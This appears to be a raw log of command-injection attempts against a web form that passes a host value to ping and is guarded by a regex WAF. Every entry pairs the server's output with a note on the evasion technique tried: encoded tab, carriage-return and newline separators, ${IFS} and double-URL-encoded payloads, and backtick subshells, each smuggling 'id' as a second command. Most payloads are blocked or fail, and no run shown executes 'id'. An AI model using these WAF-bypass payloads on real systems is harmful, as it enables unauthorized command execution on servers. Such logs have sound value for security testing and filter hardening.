ping: 127.0.0.1%09id: Name or service not known
technique: URL-encoded tab (%09) as command separator to bypass [;&|`$()\n] regex

raw_stdout: ping: 127.0.0.1%0did: Name or service not known
technique: URL-encoded carriage return %0d (\r) as separator — WAF blocks \n but may miss \r in shell context

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1;id","pattern":"[;&|`$()\\n]"}
technique: Literal semicolon in form body value — WAF regex runs on raw POST body encoding; if URL-decoded before WAF check, literal ; may slip through depending on decode order

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1${IFS}id","pattern":"[;&|`$()\\n]"}
technique: $IFS word-splitting — $ is blocked but Unicode lookalike \uff04 or encoding trick; testing literal $IFS since WAF pattern [;&|`$()\n] must match $ — double-encoded %2524 may bypass string match

raw_stdout: ping: 127.0.0.1%2524%7BIF%53%7Did: Name or service not known
technique: Double URL-encoded $IFS (%2524 = literal %24 after first decode, server decodes again to $) — bypasses WAF that scans once before double-decode

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -W 1 -c 1 -p `id`","pattern":"[;&|`$()\\n]"}
technique: Backtick subshell in -p flag argument — backtick is in WAF pattern but testing if WAF decodes form body before regex; literal backtick in form value

raw_stdout: {"error":"blocked_by_waf","match":"'host=127.0.0.1\\nid'","pattern":"control_char"}
technique: Unicode newline U+000A sent as raw UTF-8 byte in JSON-encoded form — WAF pattern targets ASCII \n (0x0a) but if body parsed as unicode string the regex engine may not match the codepoint representation before shell receives it

raw_stdout: ping: 0.0.0.0%0a/usr/bin/id: Name or service not known
technique: Absolute path to id binary with %0a separator — avoids shell built-in lookup, uses full path; %0a may be decoded after WAF check if WAF operates on raw percent-encoded string
